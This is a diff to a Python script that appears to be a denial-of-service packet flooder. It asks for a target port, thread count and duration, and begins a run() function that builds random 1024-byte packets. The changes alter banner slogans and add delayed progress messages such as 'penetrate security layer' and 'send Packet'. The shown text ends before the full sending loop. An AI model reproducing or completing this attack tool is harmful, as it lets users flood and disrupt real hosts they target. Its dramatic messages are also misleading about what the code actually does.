@@ -41,8 +41,8 @@ print("\033[93m        @ @ @    @ @ @ @  @   @ @     @     @ @ @    @ @ @    \03
 print("\033[93m        @        @     @  @     @     @     @ @ @ @  @     @  \033[0m")
 print("")
 print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—\033[0m")
-print("\033[4m             ANTI RACIST ANTI TERRORIST ANTI OPPRESSION          \033[0m")
-print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_
+print("\033[4m                         \033[0m")
+print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_\033[0m")
 while attemps < 100:
     username = input('\033[33mEnter your username: \033[0m')
     password = input('\033[94mEnter your password: \033[0m')
@@ -61,7 +61,17 @@ port = int(input("\033[97mTarget Port :  \033[0m"))
 choice = str(input("\033[31m(y/n) :  \033[0m"))
 times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
-
+time.sleep(5),
+print("\033[96m                  ⟩⟩  ANTI RACIST \033[0m "),
+time.sleep(5),
+print("\033[92m                  ⟩⟩  ANTI TERRORIST \033[0m "),
+time.sleep(5),
+print("\033[1m                  ⟩⟩  ANTI OPPRESSION \033[0m "),
+time.sleep(5),
+print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
+time.sleep(5),
+print("\033[95m                  ⟩⟩  send Packet \033[0m "),
+time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
